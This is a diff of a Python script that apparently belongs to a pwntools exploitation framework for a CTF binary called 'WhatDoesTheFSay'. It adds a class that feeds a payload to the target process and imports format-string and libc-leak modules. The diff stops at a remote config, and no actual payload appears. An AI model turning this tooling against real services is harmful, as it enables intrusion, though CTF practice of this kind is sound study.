@@ -1,16 +1,28 @@
 import ipaddress
 import pathlib
 
-from pwnlib import gdb
-
 from core.target_config import Mode, Config
 from core.targetbase import TargetBase
-from custom.f_say import WhatDoesTheFSayPwn
 from modules.format_string_magic import FormatStringMagicRead
 from loguru import logger
 from pwn import p64
-
 from modules.get_libc_address import GetLibcAddress
+import struct
+from pwnlib.tubes.process import process
+from abstract.pwntarget import PwnTarget
+
+
+class WhatDoesTheFSayPwn(PwnTarget):
+    @classmethod
+    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
+        print(proc.clean(timeout=0.2).decode())
+        proc.sendline(b'1 2')
+        print(proc.clean(timeout=0.2).decode())
+        proc.sendline(payload)
+
+    @classmethod
+    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
+        return proc.recvline()
 
 if __name__ == '__main__':
     remote_config = Config(
